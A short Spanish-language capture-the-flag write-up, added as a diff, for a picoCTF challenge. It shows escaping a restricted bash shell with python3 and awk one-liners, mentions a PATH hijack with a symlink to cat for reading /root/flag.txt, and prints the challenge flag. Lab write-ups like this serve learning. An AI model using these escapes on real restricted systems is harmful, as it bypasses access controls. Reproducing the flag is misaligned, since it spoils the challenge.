@@ -1,0 +1,50 @@
+Tengo el reto muy parecio al hash_only_1, pero el flaghasher no esta en el direcctorio que me encuentro.
+Busco el flaghasher.
+
+which flaghasher
+/usr/local/bin/flaghasher
+
+Esta en ese direcctorio, intentamos movernos ahi pero notamos que nos da el siguiente mensaje:
+
+cd ..
+-rbash: cd: restricted
+
+Esto quiere decir que estamos en un bash restringido y tenemos restringidos algunos comandos. Empezamos a buscar
+como podermo invocar un bash y encontramos 2 formas:
+
+- Con python
+
+Vemos si tenemos acceso a python:
+
+which python3
+/usr/bin/python3
+
+Efectivamente tenemos, entonces ejecutamos el siguiente comando para levantar un /bin/bash:
+
+python3 -c 'import os; os.system("/bin/bash")'
+
+Y ya estamos en un bash sin restricciones
+
+- Con awk
+
+Notamos que tenemos acceso al comando awk:
+
+which awk
+/usr/bin/awk
+
+Como contexto, awk es una herramienta para procesar texto, pero es muy poderosa, principalmente se usa para 
+analizar texto por campos y columnas, filtros y busquedas, realizar calculos y transformaciones sobre la entrada.
+Pero, tambien se puede utilizar para ejecutar comandos de sistema, entonces en nuestro caso para levantar un bash
+se haria lo siguiente:
+
+awk 'BEGIN {system("/bin/bash")}'
+
+Y con eso estamos en un bash sin restricciones
+
+Ahora ya en un bash libre, es hacer lo mismo que en el reto de hash_only_1, hacer el cambio a la variable PATH
+generar el soft link a cat y el resultado seria el siguiente:
+
+./flaghasher 
+Computing the MD5 hash of /root/flag.txt.... 
+
+picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_d23b83dc}
